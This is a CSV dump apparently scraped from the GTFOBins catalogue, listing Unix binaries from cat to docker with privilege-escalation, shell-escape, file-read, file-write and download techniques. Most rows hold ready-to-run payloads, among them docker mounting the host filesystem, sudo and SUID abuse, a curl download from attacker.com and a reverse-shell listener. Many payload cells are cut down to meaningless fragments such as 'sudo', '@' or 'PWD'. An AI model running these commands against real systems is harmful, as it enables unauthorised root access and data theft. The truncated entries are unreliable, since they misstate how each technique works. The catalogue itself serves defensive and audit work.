cat,SUID,https://gtfobins.github.io/gtfobins/cat/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
cat,Sudo,https://gtfobins.github.io/gtfobins/cat/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
cdist,Shell,https://gtfobins.github.io/gtfobins/cdist/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,cdist shell -s /bin/sh
cdist,Sudo,https://gtfobins.github.io/gtfobins/cdist/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
certbot,Shell,https://gtfobins.github.io/gtfobins/certbot/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp -d)
certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'"
certbot,Sudo,https://gtfobins.github.io/gtfobins/certbot/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
check_by_ssh,Shell,https://gtfobins.github.io/gtfobins/check_by_ssh/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx"
check_by_ssh,Sudo,https://gtfobins.github.io/gtfobins/check_by_ssh/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
check_cups,File read,https://gtfobins.github.io/gtfobins/check_cups/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
check_cups --extra-opts=@$LFILE"
check_cups,Sudo,https://gtfobins.github.io/gtfobins/check_cups/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
check_log,File write,https://gtfobins.github.io/gtfobins/check_log/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
INPUT=input_file
check_log -F $INPUT -O $LFILE"
check_log,File read,https://gtfobins.github.io/gtfobins/check_log/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
OUTPUT=output_file
check_log -F $LFILE -O $OUTPUT
cat $OUTPUT"
check_log,Sudo,https://gtfobins.github.io/gtfobins/check_log/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
check_memory,File read,https://gtfobins.github.io/gtfobins/check_memory/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
check_memory --extra-opts=@$LFILE"
check_memory,Sudo,https://gtfobins.github.io/gtfobins/check_memory/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
check_raid,File read,https://gtfobins.github.io/gtfobins/check_raid/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
check_raid --extra-opts=@$LFILE"
check_raid,Sudo,https://gtfobins.github.io/gtfobins/check_raid/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
check_ssl_cert,Command,https://gtfobins.github.io/gtfobins/check_ssl_cert/#command,It can be used to break out from restricted environments by running non-interactive system commands.,"COMMAND=id
OUTPUT=output_file
TF=$(mktemp)
echo ""$COMMAND | tee $OUTPUT"" > $TF
chmod +x $TF
check_ssl_cert --curl-bin $TF -H example.net
cat $OUTPUT"
check_ssl_cert,Sudo,https://gtfobins.github.io/gtfobins/check_ssl_cert/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
check_statusfile,File read,https://gtfobins.github.io/gtfobins/check_statusfile/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
check_statusfile $LFILE"
check_statusfile,Sudo,https://gtfobins.github.io/gtfobins/check_statusfile/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
chmod,SUID,https://gtfobins.github.io/gtfobins/chmod/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
chmod,Sudo,https://gtfobins.github.io/gtfobins/chmod/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
choom,Shell,https://gtfobins.github.io/gtfobins/choom/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,choom -n 0 /bin/sh
choom,SUID,https://gtfobins.github.io/gtfobins/choom/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
choom,Sudo,https://gtfobins.github.io/gtfobins/choom/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
chown,SUID,https://gtfobins.github.io/gtfobins/chown/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
chown,Sudo,https://gtfobins.github.io/gtfobins/chown/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
chroot,SUID,https://gtfobins.github.io/gtfobins/chroot/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
chroot,Sudo,https://gtfobins.github.io/gtfobins/chroot/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
clamscan,File read,https://gtfobins.github.io/gtfobins/clamscan/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
TF=$(mktemp -d)
touch $TF/empty.yara
clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'"
clamscan,SUID,https://gtfobins.github.io/gtfobins/clamscan/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
clamscan,Sudo,https://gtfobins.github.io/gtfobins/clamscan/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
cmp,File read,https://gtfobins.github.io/gtfobins/cmp/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
cmp $LFILE /dev/zero -b -l"
cmp,SUID,https://gtfobins.github.io/gtfobins/cmp/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
cmp,Sudo,https://gtfobins.github.io/gtfobins/cmp/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
cobc,Shell,https://gtfobins.github.io/gtfobins/cobc/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp -d)
echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x
cobc -xFj --frelax-syntax-checks $TF/x"
cobc,Sudo,https://gtfobins.github.io/gtfobins/cobc/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
column,File read,https://gtfobins.github.io/gtfobins/column/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
column $LFILE"
column,SUID,https://gtfobins.github.io/gtfobins/column/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
column,Sudo,https://gtfobins.github.io/gtfobins/column/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
comm,File read,https://gtfobins.github.io/gtfobins/comm/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
comm $LFILE /dev/null 2>/dev/null"
comm,SUID,https://gtfobins.github.io/gtfobins/comm/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
comm,Sudo,https://gtfobins.github.io/gtfobins/comm/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
composer,Shell,https://gtfobins.github.io/gtfobins/composer/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp -d)
echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json
composer --working-dir=$TF run-script x"
composer,Sudo,https://gtfobins.github.io/gtfobins/composer/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
composer,Limited SUID,https://gtfobins.github.io/gtfobins/composer/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
cowsay,Shell,https://gtfobins.github.io/gtfobins/cowsay/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp)
echo 'exec ""/bin/sh"";' >$TF
cowsay -f $TF x"
cowsay,Sudo,https://gtfobins.github.io/gtfobins/cowsay/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
cowthink,Shell,https://gtfobins.github.io/gtfobins/cowthink/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp)
echo 'exec ""/bin/sh"";' >$TF
cowthink -f $TF x"
cowthink,Sudo,https://gtfobins.github.io/gtfobins/cowthink/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
cp,File write,https://gtfobins.github.io/gtfobins/cp/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
echo ""DATA"" | cp /dev/stdin ""$LFILE"""
cp,File read,https://gtfobins.github.io/gtfobins/cp/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
cp ""$LFILE"" /dev/stdout"
cp,SUID,https://gtfobins.github.io/gtfobins/cp/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
cp,Sudo,https://gtfobins.github.io/gtfobins/cp/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
cpan,Shell,https://gtfobins.github.io/gtfobins/cpan/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,cpan
cpan,Reverse shell,https://gtfobins.github.io/gtfobins/cpan/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -lvp RPORT
cpan,File upload,https://gtfobins.github.io/gtfobins/cpan/#file-upload,It can exfiltrate files on the network.,cpan HTTP::Server::Simple
cpan,File download,https://gtfobins.github.io/gtfobins/cpan/#file-download,It can download remote files.,PWD
cpan,Sudo,https://gtfobins.github.io/gtfobins/cpan/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
cpio,Shell,https://gtfobins.github.io/gtfobins/cpio/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"echo '/bin/sh </dev/tty >/dev/tty' >localhost
cpio -o --rsh-command /bin/sh -F localhost:"
cpio,File write,https://gtfobins.github.io/gtfobins/cpio/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",$LFILE
cpio,File read,https://gtfobins.github.io/gtfobins/cpio/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
echo ""$LFILE"" | cpio -o"
cpio,SUID,https://gtfobins.github.io/gtfobins/cpio/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
cpio,Sudo,https://gtfobins.github.io/gtfobins/cpio/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
cpulimit,Shell,https://gtfobins.github.io/gtfobins/cpulimit/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,cpulimit -l 100 -f /bin/sh
cpulimit,SUID,https://gtfobins.github.io/gtfobins/cpulimit/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
cpulimit,Sudo,https://gtfobins.github.io/gtfobins/cpulimit/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
crash,Shell,https://gtfobins.github.io/gtfobins/crash/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,less
crash,Command,https://gtfobins.github.io/gtfobins/crash/#command,It can be used to break out from restricted environments by running non-interactive system commands.,"COMMAND='/usr/bin/id'
CRASHPAGER=""$COMMAND"" crash -h"
crash,Sudo,https://gtfobins.github.io/gtfobins/crash/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
crontab,Command,https://gtfobins.github.io/gtfobins/crontab/#command,It can be used to break out from restricted environments by running non-interactive system commands.,crontab
crontab,Sudo,https://gtfobins.github.io/gtfobins/crontab/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
csh,Shell,https://gtfobins.github.io/gtfobins/csh/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,csh
csh,File write,https://gtfobins.github.io/gtfobins/csh/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","export LFILE=file_to_write
ash -c 'echo DATA > $LFILE'"
csh,SUID,https://gtfobins.github.io/gtfobins/csh/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
csh,Sudo,https://gtfobins.github.io/gtfobins/csh/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
csplit,File write,https://gtfobins.github.io/gtfobins/csplit/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",xx0file_to_write
csplit,File read,https://gtfobins.github.io/gtfobins/csplit/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
csplit $LFILE 1
cat xx01"
csplit,SUID,https://gtfobins.github.io/gtfobins/csplit/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
csplit,Sudo,https://gtfobins.github.io/gtfobins/csplit/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
csvtool,Shell,https://gtfobins.github.io/gtfobins/csvtool/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,csvtool call '/bin/sh;false' /etc/passwd
csvtool,File write,https://gtfobins.github.io/gtfobins/csvtool/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
TF=$(mktemp)
echo DATA > $TF
csvtool trim t $TF -o $LFILE"
csvtool,File read,https://gtfobins.github.io/gtfobins/csvtool/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
csvtool trim t $LFILE"
csvtool,SUID,https://gtfobins.github.io/gtfobins/csvtool/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
csvtool,Sudo,https://gtfobins.github.io/gtfobins/csvtool/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
cupsfilter,File read,https://gtfobins.github.io/gtfobins/cupsfilter/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
cupsfilter -i application/octet-stream -m application/octet-stream $LFILE"
cupsfilter,SUID,https://gtfobins.github.io/gtfobins/cupsfilter/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
cupsfilter,Sudo,https://gtfobins.github.io/gtfobins/cupsfilter/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
curl,File upload,https://gtfobins.github.io/gtfobins/curl/#file-upload,It can exfiltrate files on the network.,@
curl,File download,https://gtfobins.github.io/gtfobins/curl/#file-download,It can download remote files.,"URL=http://attacker.com/file_to_get
LFILE=file_to_save
curl $URL -o $LFILE"
curl,File write,https://gtfobins.github.io/gtfobins/curl/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
TF=$(mktemp)
echo DATA >$TF
curl ""file://$TF"" -o ""$LFILE"""
curl,File read,https://gtfobins.github.io/gtfobins/curl/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=/tmp/file_to_read
curl file://$LFILE"
curl,SUID,https://gtfobins.github.io/gtfobins/curl/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
curl,Sudo,https://gtfobins.github.io/gtfobins/curl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
cut,File read,https://gtfobins.github.io/gtfobins/cut/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
cut -d """" -f1 ""$LFILE"""
cut,SUID,https://gtfobins.github.io/gtfobins/cut/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
cut,Sudo,https://gtfobins.github.io/gtfobins/cut/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
dash,Shell,https://gtfobins.github.io/gtfobins/dash/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,dash
dash,File write,https://gtfobins.github.io/gtfobins/dash/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","export LFILE=file_to_write
dash -c 'echo DATA > $LFILE'"
dash,SUID,https://gtfobins.github.io/gtfobins/dash/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
dash,Sudo,https://gtfobins.github.io/gtfobins/dash/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
date,File read,https://gtfobins.github.io/gtfobins/date/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
date -f $LFILE"
date,SUID,https://gtfobins.github.io/gtfobins/date/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
date,Sudo,https://gtfobins.github.io/gtfobins/date/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
dc,Shell,https://gtfobins.github.io/gtfobins/dc/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,dc -e '!/bin/sh'
dc,Sudo,https://gtfobins.github.io/gtfobins/dc/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
dc,Limited SUID,https://gtfobins.github.io/gtfobins/dc/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
dd,File write,https://gtfobins.github.io/gtfobins/dd/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
echo ""DATA"" | dd of=$LFILE"
dd,File read,https://gtfobins.github.io/gtfobins/dd/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
dd if=$LFILE"
dd,SUID,https://gtfobins.github.io/gtfobins/dd/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
dd,Sudo,https://gtfobins.github.io/gtfobins/dd/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
debugfs,Shell,https://gtfobins.github.io/gtfobins/debugfs/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"debugfs
!/bin/sh"
debugfs,SUID,https://gtfobins.github.io/gtfobins/debugfs/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
debugfs,Sudo,https://gtfobins.github.io/gtfobins/debugfs/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
dialog,File read,https://gtfobins.github.io/gtfobins/dialog/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
dialog --textbox ""$LFILE"" 0 0"
dialog,SUID,https://gtfobins.github.io/gtfobins/dialog/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
dialog,Sudo,https://gtfobins.github.io/gtfobins/dialog/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
diff,File read,https://gtfobins.github.io/gtfobins/diff/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
diff --line-format=%L /dev/null $LFILE"
diff,SUID,https://gtfobins.github.io/gtfobins/diff/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
diff,Sudo,https://gtfobins.github.io/gtfobins/diff/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
dig,File read,https://gtfobins.github.io/gtfobins/dig/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
dig -f $LFILE"
dig,SUID,https://gtfobins.github.io/gtfobins/dig/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
dig,Sudo,https://gtfobins.github.io/gtfobins/dig/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
distcc,Shell,https://gtfobins.github.io/gtfobins/distcc/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,distcc /bin/sh
distcc,SUID,https://gtfobins.github.io/gtfobins/distcc/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
distcc,Sudo,https://gtfobins.github.io/gtfobins/distcc/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
dmesg,Shell,https://gtfobins.github.io/gtfobins/dmesg/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,less
dmesg,File read,https://gtfobins.github.io/gtfobins/dmesg/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
dmesg -rF ""$LFILE"""
dmesg,Sudo,https://gtfobins.github.io/gtfobins/dmesg/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
dmidecode,Sudo,https://gtfobins.github.io/gtfobins/dmidecode/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
dmsetup,SUID,https://gtfobins.github.io/gtfobins/dmsetup/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
dmsetup,Sudo,https://gtfobins.github.io/gtfobins/dmsetup/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
dnf,Sudo,https://gtfobins.github.io/gtfobins/dnf/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
docker,Shell,https://gtfobins.github.io/gtfobins/docker/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker,File write,https://gtfobins.github.io/gtfobins/docker/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","CONTAINER_ID=""$(docker run -d alpine)"" # or existing
TF=$(mktemp)
echo ""DATA"" > $TF
docker cp $TF $CONTAINER_ID:$TF
docker cp $CONTAINER_ID:$TF file_to_write"
docker,File read,https://gtfobins.github.io/gtfobins/docker/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","CONTAINER_ID=""$(docker run -d alpine)""  # or existing
TF=$(mktemp)
docker cp file_to_read $CONTAINER_ID:$TF
docker cp $CONTAINER_ID:$TF $TF
cat $TF"
docker,SUID,https://gtfobins.github.io/gtfobins/docker/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
docker,Sudo,https://gtfobins.github.io/gtfobins/docker/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
